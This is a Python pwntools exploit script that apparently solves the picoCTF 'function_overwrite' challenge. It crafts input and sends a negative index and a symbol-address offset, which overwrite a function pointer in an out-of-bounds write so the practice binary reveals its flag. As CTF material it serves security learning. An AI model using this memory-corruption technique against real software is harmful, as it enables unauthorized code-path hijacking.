#!/usr/bin/env python3

''''
$ ./function_overwrite.py 
[*] './function_overwrite.bin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './function_overwrite.bin': pid 209119
[+] Receiving all data: Done (50B)
[*] Process './function_overwrite.bin' stopped with exit code 0 (pid 209119)
You're 1337. Here's the flag.
picoCTF{fake_flag}
'''

from sys import argv
from pwn import *

BIN = './function_overwrite.bin'

IP = 'saturn.picoctf.net'
PORT = 56255

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


# generate payload
MAX_PAYLOAD_SIZE = 127
payload = b'A' * 20 + b'%'  # value of 1337

hard_checker_addr = elf.symbols['hard_checker']
easy_checker_addr = elf.symbols['easy_checker']

# change the value of hard_checker to easy_checker
n1 = -16
n2 = easy_checker_addr - hard_checker_addr

# send payload
assert(len(payload) <= MAX_PAYLOAD_SIZE)
p = open_instance()
p.readuntil(b'Tell me a story and then I\'ll tell you if you\'re a 1337 >> ')
p.sendline(payload)
p.readuntil(b'give me two numbers. Keep the first one less than 10.')
p.sendline(f"{n1} {n2}".encode())

print(p.recvall().strip().decode())
